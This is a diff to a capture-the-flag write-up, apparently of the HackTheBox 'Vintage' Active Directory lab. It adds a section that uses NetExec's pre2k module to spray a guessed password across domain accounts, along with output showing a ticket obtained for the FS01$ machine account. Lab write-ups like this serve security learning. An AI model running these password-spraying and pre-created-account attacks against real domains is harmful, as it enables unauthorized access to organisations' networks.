@@ -152,6 +152,19 @@ PV > Get-DomainComputer -Identity FS01 -Properties *
 ![alt text](../assets/images/vintage7.png)
 
 its great we learn something new so lets check privileges of FS01 machine account. So we can understand everything more clear.
+### pre2k
+
+```powershell
+➜  Vintage nxc ldap DC01.vintage.htb -u usernames.txt -p fs01 -k -M pre2k
+LDAP        DC01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
+LDAP        DC01.vintage.htb 389    dc01.vintage.htb [-] vintage.htb\Administrator:fs01 KDC_ERR_PREAUTH_FAILED
+LDAP        DC01.vintage.htb 389    dc01.vintage.htb [-] vintage.htb\Guest:fs01 KDC_ERR_CLIENT_REVOKED
+LDAP        DC01.vintage.htb 389    dc01.vintage.htb [-] vintage.htb\krbtgt:fs01 KDC_ERR_CLIENT_REVOKED
+LDAP        DC01.vintage.htb 389    dc01.vintage.htb [-] vintage.htb\DC01$:fs01 KDC_ERR_PREAUTH_FAILED
+LDAP        DC01.vintage.htb 389    dc01.vintage.htb [-] vintage.htb\gMSA01$:fs01 KDC_ERR_PREAUTH_FAILED
+LDAP        DC01.vintage.htb 389    dc01.vintage.htb [+] vintage.htb\FS01$:fs01 
+PRE2K       DC01.vintage.htb 389    dc01.vintage.htb [+] Successfully obtained TGT for 0 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/ccache
+```
 
 and booomm!!!
 
@@ -533,6 +546,7 @@ Lets see DelegatAdmins what they can do
 ![alt text](../assets/images/vintage19.png)
 
 Noice we are so close.
+![alt text](../assets/images/vintage20.png)
 
 ## AddMember
 
